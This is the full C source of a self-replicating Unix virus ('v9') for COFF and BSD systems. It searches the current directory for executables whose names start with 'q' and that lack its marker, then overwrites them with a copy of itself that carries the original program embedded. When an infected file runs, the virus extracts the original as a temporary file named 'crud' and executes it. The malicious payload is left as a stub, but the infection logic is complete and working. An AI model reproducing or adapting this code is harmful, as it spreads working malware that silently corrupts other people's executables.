
/*
 * compilation:
 * cc -o v9 -DCOFF v9.c
 * cc -o v9 -DBSD v9.c
 */

#ifdef  COFF
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <filehdr.h>
#include <aouthdr.h>
#include <scnhdr.h>
#undef BSD_MARK
#define MARK 0X696E6665
#undef BSD
#endif


#ifdef BSD
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <a.out.h>
#define BSD_MARK 0X696E6665
#undef MARK
#undef COFF
#endif

/* definition of states */
#define PRISTINE 0 /* not executed even once */
#define LOADING  1 /* executed once, has headers loaded */
#define PREGNANT 2 /* executed twice, has a file loaded */
#define WRITE_SELF 3 /* ready to write an executable image of self to disk */
#define ENTRY 4 /* pseudo-state: in this state at beginning of each execution */
#define GONZO 5 /* panic exit state: something gone wrong */
#define QUIT 6 /* pseudo-state: leaves state machine */

/* transition table:  the next state to enter depends on two parameter,
 * "loaded", and "headers", and the state that machine is in right now. */

/*
 * table organized by:
 * last state, headers, loaded
 *  (0-5),      (0,1),   (0,1)
 */
static int what_next[6][2][2] = {
{ { GONZO, WRITE_SELF }, { GONZO, GONZO },
},

{ { WRITE_SELF, LOADING }, { PRISTINE, GONZO },
},

{ { GONZO, LOADING }, { GONZO, GONZO },

},

{ { QUIT, QUIT }, { GONZO, GONZO },
},

{ { PREGNANT, LOADING }, { GONZO, PRISTINE },
},

{ { QUIT, QUIT }, { QUIT, QUIT },
}

};

/*
 * the transition table is deliberately cowardly:
 * it enters the GONZO state when a combo of parameters that could
 * foreseeably be corrected, but is nonetheless wrong, is encountered.
 */

#undef DEBUG
#ifdef DEBUG
#define D(x) x
#else
#define D(x)
#endif

#if defined(DEBUG) && defined(BSD)
#include <signal.h>
#endif

#ifdef COFF
/* necessary to declare these as static and put something in them
 * to get compiler to put them in the .data section rather than the
 * .bss section */
static FILHDR fhdptr = 52;
static AOUTHDR autptr = 53;
static SCNHDR scnptr[12] = {
        1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 1, 2 };


/* section no. of .data section */
static datasn = 1;
#endif

/* non-zero if executable headers in data segment are nonsense */
static headers = 1;
/* non-zero if other program isn't loaded into data segment */
static loaded = 1;

#ifdef BSD
static struct exec exhdr = 93;
#endif

extern errno;

#define PAGESIZE 8192
#define NFG 0x7f

main( ac, av )
int     ac;
char    **av;
{

        int     j, next_state;

        int     fp_out, fp_in;
        char    *infect;
        static char     *sbeak = (char *)0x400000;
        static int      size = 32, xsize;

        int     write_headers(), read_headers();
        void error_dump(), monkey_headers();
        char    *sbrk(), *decide();
#ifdef BSD
        D(void funk(); )
#endif

        D( write( 2, "main\n", 5 ); )

#if defined(BSD) && defined( DEBUG )
        /* install signal handler */
        if ( (int)signal( SIGSEGV, funk ) == -1 ) {
                write( 2, "installing signal\n", 18 );
                _exit( errno );
        }
#endif

        /*
         * state machine to decide what to do next
         */

        next_state = ENTRY;

        while ((next_state = what_next[next_state][headers][loaded]) != QUIT ) {

                switch ( next_state ) {

                case PRISTINE:

                        D( write( 2, "pristine\n", 9 ); )

                        /* open a file to read header info from */
                        if ( (fp_in = open( *av, O_RDONLY )) < 0 ) {
                                write(2, "couldn't open self for header read\n", 35 );
                                _exit( errno );
                        }

                        /* read in COFF headers */
                        size = read_headers( fp_in );

                        /* close self, done reading headers */
                        close( fp_in );

                        /* change header information to reflect bss and data combo */
                        monkey_headers();

                        /* find out where current data segment ends */
                        /* this call will find end of .data and .bss segments */
                        if ( (sbeak = sbrk( 0 )) < 0 ) {
                                write(2, "1st sbrk() failed\n", 18 );
                                _exit( errno );
                        }

                        /* open a file to send new image of self with header info */
                        if ( (fp_out = open( *(av + 1), O_WRONLY | O_CREAT )) < 0 ) {
                                write(2, "couldn't open output file for write\n", 36 );
                                _exit( errno );
                        }

                        chmod( *(av + 1), 0755 );

                        headers = 0;

                        break;


                case LOADING:

                        D(write( 2, "loading\n", 8 ); )

                        /* find a good file to load and get size of selected file */
                        infect = decide( &xsize );

                        if ( infect[0] == NFG ) {
                                /* this would make a good trigger mechanism:
                                 * malicious part would go here
                                 */
                                write( 2, "nothing left to infect\n\n", 24 );
                                _exit( 666 );
                                break;
                        }

                        /* open that file */
                        D( write(2, "opening file\n", 13); )
                        if ( (fp_in = open( infect, O_RDONLY )) < 0 ) {
                                write(2, "couldn't open file for load\n", 28 );
                                _exit( errno );
                        }

                        /* move system break */
                        D( write(2, "moving sbrk\n", 12); )
                        if ( sbrk( xsize ) < 0 ) {
                                write(2, "2nd sbrk() failed\n", 18 );
                                _exit( errno );
                        }

                        /* read in selected file */
                        D( write(2, "reading in file\n", 16); )
                        if ( read( fp_in, (char *)sbeak, xsize ) < 0 ) {
                                write(2, "load failed\n", 12 );
                                _exit( errno );
                        }

                        /* tinker with headers to reflect loaded condition */
#ifdef COFF
                        scnptr[datasn].s_size  = (long)((int)sbeak - scnptr[datasn].s_vaddr + xsize);
                        if ( fhdptr.f_opthdr ) {
                                /* optional header is present */
                                autptr.dsize = scnptr[datasn].s_size;
                        }

#endif

#ifdef BSD
                        exhdr.a_data = (long)((int)sbeak - N_DATADDR( exhdr ) + xsize);

#endif

                        /* open a file to write loaded self into */
                        if ((fp_out = open(infect, O_WRONLY | O_TRUNC)) < 0) {
                                write(2, "couldn't open file for rewrite of loaded self\n", 46);
                                _exit( errno );
                        }

                        loaded = 0;

                        break;

                case PREGNANT:

                        D(write(2, " pregnant\n", 10 ); )

                        switch ( fork() ) {

                        case -1: /* system call failure */
                                write( 2, "fork() syscall failure\n", 23 );
                                _exit( errno );
                                break;

                        default: /* parent */

                                D( write( 2, "child of infected file\n", 23 ); )

                                /* open a temp file to write loaded file to */
                                if ((fp_out = open( "crud", O_WRONLY | O_CREAT)) < 0) {
                                        write(2, "couldn't open output file for rewrite\n", 38 );
                                        _exit( errno );
                                }

                                D(write(2, "opened output file for write of loaded file\n", 44); )

                                /* write loaded file from memory to disk */
                                if ( write( fp_out, (char *)sbeak, xsize ) < xsize ) {
                                        write(2, "couldn't write loaded file\n", 27 );
                                        _exit( errno );
                                }

                                D(write(2, "wrote loaded file\n", 18); )

                                close( fp_out );

                                /* make new file executable and exec it */
                                chmod( "crud", 0755 );

                                D(write(2, "ready to exec loaded file\n", 25); )

                                execv( "crud", av );

                                write( 2, "execv failed\n", 13 );

                                /* should probably unlink "crud" at this point */

                                _exit( errno );

                                break;

                        case 0: /* child */

                                D( write( 2, "parent of infected file\n", 24 ); )

                                /* reset system break */
                                if ( brk( sbeak ) < 0 ) {
                                        write(2, "couldn't reset system break\n", 28 );
                                        _exit( errno );
                                }

                                /* reset parameter so that next state will be LOADING,
                                 * this process will still be executing - no self-write */
                                loaded = 1;

                                break;

                        }

                        break;



                case WRITE_SELF:

                        D( write( 2, "write self\n", 11); )

                        size = write_headers( fp_out );

                        /* returned value has size of sections in it */
                        size = write_sections( size, fp_out );

                        /* zero fill file to pagesize */
                        j = PAGESIZE - size % PAGESIZE;

                        while ( j--)
                                write( fp_out, "\000", 1 );

                        close( fp_out );

                        break;

                case GONZO:
                default:
                        write( 2, "something wrong with state machine\n", 35 );
                        error_dump( next_state, headers, loaded, what_next[next_state][headers][loaded] );
                        break;
                }

        }


        _exit( 0 );


}




int
write_headers( fp_out )
int     fp_out; /* file descriptor to write headers to */
{
        int     total;
#ifdef COFF
        int     i, seize;
#endif

        D( write( 2, "write headers\n", 14 ); )

        /* just write already loaded headers to output file */

#ifdef COFF
        if ( (total = write( fp_out, (char *) & fhdptr, (int)sizeof( struct filehdr ))) < 0) {
                write( 2, "couldn't rewrite header\n", 24 );
                _exit( errno );
        }


        if ( fhdptr.f_opthdr ) {
                /* optional header is present */
                if ( (seize = write( fp_out, (char *) & autptr, (int)sizeof( struct aouthdr )) ) < 0 ) {
                        write( 2, "couldn't rewrite Unix system header\n", 36 );
                        _exit( errno );
                }

                total += seize;
        }


        /* write out section headers */
        for ( i = 0; i < fhdptr.f_nscns; ++i ) {

                if ( (seize = write( fp_out, (char *) & scnptr[i], (int)SCNHSZ) ) < 0 ) {
                        write( 2,
                            "couldn't rewrite section header\n", 32 );
                        _exit(i);
                }

                total += seize;
        }
#endif

#ifdef BSD

        if ( (total = write( fp_out, (char *) & exhdr, (int)sizeof( struct exec ))) < (int)sizeof( struct exec ) ) {
                write( 2, "couldn't rewrite header\n", 24 );
                _exit( errno );
        }
#endif

        return total;
}




int     write_sections( filesz, fp_out )
int     filesz, fp_out;
{

        int     scnsize, j;
#ifdef COFF
        int     i;
#endif

        D( write( 2, "write sections\n", 15 ); )

        scnsize = filesz;

#ifdef COFF
        for ( i = 0; i < fhdptr.f_nscns; ++i ) {

                if ( scnptr[i].s_scnptr ) {
                        /* section has some stuff on disk */
                        if ( scnsize < scnptr[i].s_scnptr ) {
                                /* need to pad file to match headers */
                                j = scnptr[i].s_scnptr - scnsize;
                                while ( j ) {
                                        --j;
                                        write( fp_out, "\000", 1 );
                                        ++scnsize;
                                }
                        }

                        /* write segment i from memory */

                        if ( (j = write( fp_out, (char *)scnptr[i].s_vaddr, (unsigned)scnptr[i].s_size )) < scnptr[i].s_size ) {
                                write(2, "error writing segment\n", 22 );
                                _exit( errno );
                        }

                        scnsize += j;
                }
        }
#endif

#ifdef BSD
        while ( scnsize < N_TXTOFF( exhdr ) ) {
                write( fp_out, "\000", 1 );
                ++scnsize;
        }

        /* write text segment from memory */
        if ( (j = write( fp_out, (char *)(N_TXTADDR( exhdr ) + sizeof(struct exec )), (int)exhdr.a_text - sizeof(struct exec ))) <
            exhdr.a_text - sizeof(struct exec ) ) {
                write(2, "error writing text segment\n", 27 );
                _exit( errno );
        }

        scnsize += j;

        /* write data segment from memory */
        if ( (j = write( fp_out, (char *)(N_DATADDR( exhdr )), (int)exhdr.a_data )) < exhdr.a_data ) {
                write(2, "error writing data segment\n", 27 );
                _exit( errno );
        }

        scnsize += j;
#endif

        return scnsize;


}


void
error_dump( state, no_headers, not_loaded, next_state )
int     state, no_headers, not_loaded, next_state;
{

        void print_state();

        D( write( 2, "error dump\n", 11 ); )

        write( 2, "state is ", 9 );

        print_state( state );

        write( 2, "no_headers is ", 14);
        if ( no_headers )
                write( 2, "TRUE\n", 5 );
        else
                write( 2, "FALSE\n", 6 );

        write( 2, "not_loaded is ", 14);
        if ( not_loaded )
                write( 2, "TRUE\n", 5 );
        else
                write( 2, "FALSE\n", 6 );

        write( 2, "next state is ", 14 );

        print_state( next_state );


}


void
print_state( state )
int     state;
{

        D( write( 2, "print_state\n", 12 ); )

        switch ( state ) {

        case PRISTINE:
                write( 2, "PRISTINE\n", 9);
                break;

        case LOADING:
                write( 2, "LOADING\n", 8);
                break;

        case PREGNANT:
                write( 2, "PREGNANT\n", 9);
                break;


        case WRITE_SELF:
                write( 2, "WRITE_SELF\n", 11);
                break;

        case ENTRY:
                write( 2, "ENTRY\n", 6);
                break;

        case GONZO:
                write( 2, "GONZO\n", 6);
                break;

        case QUIT:
                write( 2, "QUIT\n", 5);
                break;

        default:
                write( 2, "wrongo\n", 7 );
                break;

        }
}


/*
 * machine dependant directory access stuff
 * decide() is the only routine that is called from the main, more
 * portable portion of this program.  any ancillary subroutines must
 * be carefully defined inside #ifdef's for the appropriate machine.
 * decide() returns a pointer to a string with the name of an eligible
 * file in it.  it also puts the size of the file in bytes into the 
 * passed argument.
 */

#if defined(sparc) || defined(mc68000)

/* SunOS directories are not exactly as documented for 4.0.3 */
#define MAXNAMLEN       255
#define BUFSIZ  1024

struct dirent {
        long    d_fileno;             /* file number of entry */
        short   d_reclen;             /* length of this record */
        short   d_namlen;             /* length of string in d_name */
        char    d_name[MAXNAMLEN + 1];  /* name (up to MAXNAMLEN + 1) */
};

char    *
decide( s )
int     *s;
{
        int     fd, offset;
        char    ubuf[ BUFSIZ ];
        struct dirent *dirptr;
        struct stat stbuf;
        static char     fname[ MAXNAMLEN + 1 ];

        D( write( 2, "decide\n", 7 ); )

        fname[0] = NFG;

        if ( (fd = open(".", O_RDONLY)) < 0 ) {
                write( 2, "couldn\'t open .\n", 16 );
                _exit( errno );
        }

        if ( read( fd, ubuf, BUFSIZ ) < 0 ) {
                write( 2, "reading .\n", 10 );
                _exit( errno );
        }

        close( fd );

        dirptr = (struct dirent *)ubuf;

        offset = 0;

        while ( (offset < BUFSIZ) && (offset >= 0) && (dirptr->d_namlen > 0) ) {

                D(write( 2, "examining ", 10 ); )
                D(write( 2, dirptr->d_name, dirptr->d_namlen ); )
                D(write( 2, "\n", 1 ); )

                /* only examine files with names starting with 'q' */
                if ( dirptr->d_name[0] == 'q' ) {

                        /* decide whether file is infected already or not */
                        if ( not_infectd( dirptr->d_name ) ) {

                                /* get file status */
                                if ( stat( dirptr->d_name, (struct stat *) & stbuf ) < 0 ) {
                                        D(write( 2, "stat call failed\n", 17 ); )
                                        D(write( 2, dirptr->d_name, dirptr->d_namlen ); )
                                        D(write( 2, "\n", 1 ); )
                                        continue;
                                }

                                /* decide if file has appropriate
            * read, write and execute permissions */
                                if ( accetab( (int)stbuf.st_mode ) ) {

                                        int     i;

                                        /* copy name into static buffer */
                                        for ( i = 0; dirptr->d_name[i]; ++i )
                                                fname[i] = dirptr->d_name[i];

                                        fname[i] = '\0';

                                        D(write( 2, "infecting ", 10 ); )
                                        D(write( 2, fname, dirptr->d_namlen ); )
                                        D(write( 2, "\n", 1 ); )

                                        *s = stbuf.st_size;
                                        break;

                                }
                        }

                }

                offset += dirptr->d_reclen;
                dirptr = (struct dirent *)(&ubuf[ offset ]);
        }

        return fname;

}




int
accetab( mode )
int     mode;
{
        D( write( 2, "accetab\n", 8 ); )

        if ( (mode & S_IFREG) && (mode & S_IREAD ) && (mode & S_IWRITE ) && (mode & 
            S_IEXEC ))
                return 1;
        else
                return 0;
}


int
not_infectd( fn )
char    *fn;
{
        struct exec exh;
        int     fd2;

        fd2 = open( fn, O_RDONLY );

        read( fd2, (char *) & exh, sizeof( struct exec ) );

        close( fd2 );

        if ( exh.a_syms == BSD_MARK )
                return 0;
        else
                return 1;
}


#endif

#ifdef mips

#include <sys/types.h>
#include <sys/sema.h>
#include <sys/fs/efs.h>

char    *
decide( s )
int     *s;
{
        char    dir_block[ BBSIZE ];
        struct efs_dirblk *dirhdr;
        struct efs_dent *d_ent;
        int     fd, tfd, i;
        struct stat stbuf;
        static FILHDR fhdx;

        /* file name must be static since only pointer to it gets returned.
         * if it were automatic, that pointer would be invalid after function
         * returned. */
        static char     fname[256];

        D( write( 2, "decide\n", 7 ); )

        fname[0] = NFG;

        if ( (fd = open( ".", O_RDONLY )) < 0 ) {
                write( 2, "couldn't open \".\"\n", 18);
                _exit( errno );
        }


        if ( (read( fd, dir_block, BBSIZE)) < 0 ) {
                write(2, "couldn't read \".\"\n", 18);
                close( fd );
                _exit( errno );
        }

        close( fd );

        dirhdr = (struct efs_dirblk *)dir_block;

        /* loop over all file names in directory */
        for ( i = 0; i < dirhdr->slots; ++i ) {

                d_ent = (struct efs_dent *)(dir_block + EFS_SLOTAT( (struct efs_dirblk *)dir_block, i ));

                /* only examine files with names starting with 'q' */
                if ( d_ent->d_name[0] == 'q' ) {

                        /* file status call */
                        if ( stat( d_ent->d_name, (struct stat *) & stbuf ) < 0 ) {
                                D(write( 2, "stat call failed\n", 17 ); )
                                D(write( 2, d_ent->d_name, d_ent->d_namlen ); )
                                D(write( 2, "\n", 1 ); )
                                continue;
                        }

                        /* decide if file has appropriate
                        * read, write and execute permissions */
                        if ( accetab( (int)stbuf.st_mode ) ) {

                                /* determine if this file is already infected */
                                if ( (tfd = open( d_ent->d_name, O_RDONLY )) > 0 ) {

                                        if ( read( tfd, (char *) & fhdx, sizeof( struct filehdr ) ) == sizeof( struct filehdr ) ) {

                                                close( tfd );

#ifdef MARK
                                                if ( fhdx.f_timdat != MARK ) {
#endif

                                                        for ( i = 0; d_ent->d_name[i]; ++i )
                                                                fname[i] = d_ent->d_name[i];

                                                        D(write( 2, d_ent->d_name, d_ent->d_namlen ); )
                                                        D(write( 2, "\n", 1 ); )

                                                        *s = stbuf.st_size;
                                                        break;
#ifdef MARK
                                                }
#endif
                                        }
                                }
                        } /* end of if over permissions acceptable */

                }

        }

        return( fname );
}


int
accetab( mode )
int     mode;
{
        D( write( 2, "accetab\n", 8 ); )

        if ( (mode & S_IFREG) && (mode & S_IREAD ) && (mode & S_IWRITE ) && (mode & S_IEXEC ))
                return 1;
        else
                return 0;
}


#endif /* IRIX efs directory access */

#ifdef mc68k

/* actually the old-style 14 character Unix file system */

#include <sys/dir.h>

char    *
decide( s )
int     *s;
{
        struct direct entry;
        struct stat stbuf;
        struct filehdr fhdx;
        int     dirfd, i, tfd;
        /* file name must be static since only pointer to it gets returned.
         * if it were automatic, that pointer would be invalid after function
         * returned. */
        static char     fname[DIRSIZ];

        D( write( 2, "decide\n", 7 ); )

        if ( (dirfd = open( ".", O_RDONLY )) < 0 ) {
                write( 2, "couldn't open \".\"\n", 18 );
                _exit( errno );
        }

        fname[0] = NFG;

        while ( read( dirfd, (char *) & entry, sizeof(struct direct ) ) > 0 ) {

                /* only examine files with names starting with 'q' */
                if ( entry.d_name[0] == 'q' ) {

                        /* file status call */
                        if ( stat( entry.d_name, (struct stat *) & stbuf ) < 0 ) {
                                D(write( 2, "stat call failed\n", 17 );)
                                continue;
                        }

                        /* determine whether this file has acceptable 
                                 * read, write and execute permissions */
                        if ( accetab( (int)stbuf.st_mode ) ) {

                                /* determine if this file is already infected */
                                if ( (tfd = open( entry.d_name, O_RDONLY )) > 0 ) {

                                        if ( read( tfd, (char *) & fhdx, sizeof( struct filehdr ) ) == sizeof( struct filehdr ) ) {

                                                close( tfd );

#ifdef MARK
                                                if ( fhdx.f_timdat != MARK ) {
#endif

                                                        for ( i = 0; entry.d_name[i]; ++i )
                                                                fname[i] = entry.d_name[i];

                                                        D(write( 2, entry.d_name, DIRSIZ ); )
                                                        *s = stbuf.st_size;
                                                        break;
#ifdef MARK
                                                }
#endif
                                        }
                                }
                        } /* end of if over permissions acceptable */
                } /* end of if over file name */
        } /* end of while over no. of directory entries */

        close( dirfd );

        return fname;
}


int
accetab( mode )
int     mode;
{
        D( write( 2, "accetab\n", 8 ); )

        if ( (mode & S_IFREG) && (mode & S_IREAD ) && (mode & S_IWRITE ) && (mode & S_IEXEC ))
                return 1;
        else
                return 0;
}


#endif

/* end of machine dependant directory access stuff */

void
monkey_headers()
{
#ifdef COFF
        int     j, delsize;
#endif

        D( write( 2, "monkey_headers\n", 15 ); )

        /* turn off symbol table stuff */

#ifdef COFF
        fhdptr.f_symptr = 0;
        fhdptr.f_nsyms = 0;
#endif


#ifdef MARK
        /* mark as infected */
        fhdptr.f_timdat = MARK;
#endif

#ifdef BSD_MARK
        exhdr.a_syms = BSD_MARK;
#endif

        /* could potentially only write to disk the routines that
         * program will need from now on.  everything aft of this
         * function could be eliminated from the stuff written to
         * disk, and loaded from disk next execution */

#ifdef COFF
        /* find .data header */
        for ( datasn = 1; datasn < fhdptr.f_nscns; ++datasn ) {
                if ( scnptr[datasn].s_name[1] == 'd' )
                        break;
        }
#endif

        /* rearrange header data so .bss is now in .data */

#ifdef COFF 

        delsize = 0;

        for ( j = datasn + 1; j < fhdptr.f_nscns; ++j ) {
                delsize += scnptr[j].s_size;
                scnptr[datasn].s_size += scnptr[j].s_size;
                scnptr[j].s_size = 0;
                scnptr[j].s_vaddr = 0;
                scnptr[j].s_paddr = 0;
                scnptr[j].s_scnptr = 0;
        }

        if ( fhdptr.f_opthdr ) {
                /* optional header is present */
                autptr.dsize += delsize;
                autptr.bsize = 0;
        }
#endif 

#ifdef BSD
        exhdr.a_data += exhdr.a_bss;
        exhdr.a_bss = 0;
#endif

}


int
read_headers( fp )
int     fp; /* file descriptor to read headers from */
{

        int     total;

#ifdef COFF
        int     i, seize;


        if ( (total = read( fp, (char *) & fhdptr, sizeof( struct filehdr ))) < 0 ) {
                write( 2, "couldn't read header\n", 21 );
                _exit( errno );
        }

        if ( fhdptr.f_opthdr ) {
                /* optional header is present */
                if ( (seize = read( fp, (char *) & autptr, (int)sizeof(struct aouthdr ))) < 0) {
                        write( 2, "couldn't read Unix system header\n", 33 );
                        _exit( errno );
                }
                total += seize;
        }

        for ( i = 0; i < fhdptr.f_nscns; ++i ) {
                if ( (seize = read( fp, (char *) & scnptr[i], SCNHSZ)) < 0 ) {
                        write( 2, "couldn't read section header\n", 29);
                        _exit(i);
                }
                total += seize;
        }
#endif


#ifdef BSD
        if ( (total = read( fp, (char *) & exhdr, sizeof( struct exec ))) < 0 ) {
                write( 2, "couldn't read header\n", 21 );
                _exit( errno );
        }
#endif

        return total;
}


#if defined(BSD) && defined( DEBUG )

void
funk( sig, code, scp, addr )
int     sig, code;
struct sigcontext *scp;
char    *addr;
{
        char    fuggle[9];
        int     r, i, j;

        write( 2, "SIGSEGV\n", 8 );

        for ( i = 28, j = 0; i >= 0; i -= 4 ) {

                r = ((int)addr >> i) & 0x0f;

                if ( r < 10 )
                        fuggle[j] = (char)r + '0';
                else
                        fuggle[j] = (char)r - 10 + 'a';

                ++j;

        }

        fuggle[8] = 0;

        write( 2, fuggle, 9 );

        _exit( errno );
}


#endif
